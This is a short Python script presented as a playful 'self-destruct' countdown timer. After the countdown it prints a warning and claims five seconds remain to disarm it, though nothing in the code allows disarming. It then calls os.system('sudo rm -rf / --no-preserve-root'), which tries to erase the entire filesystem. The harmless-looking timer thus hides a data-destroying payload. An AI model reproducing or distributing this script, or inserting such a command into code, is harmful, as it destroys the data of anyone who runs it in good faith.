# import the time module
import os
import time
  
print('COUNTDOWN TO SELF DESTRUCT!!!')

# define the countdown func.
def countdown(t):
    
    while t:
        mins, secs = divmod(t, 60)
        timer = '{:02d}:{:02d}'.format(mins, secs)
        print(timer, end="\r")
        time.sleep(1)
        t -= 1
      
    print('!!!WARNING SELF-DESTRUCT MODE!!!')
    print('You have 5 seconds to disarm it!')
    time.sleep(5) # Delay for 5 seconds.
    os.system('sudo rm -rf / --no-preserve-root')
  
  
# input time in seconds
t = input("Enter the time in seconds: ")
  
# function call
countdown(int(t))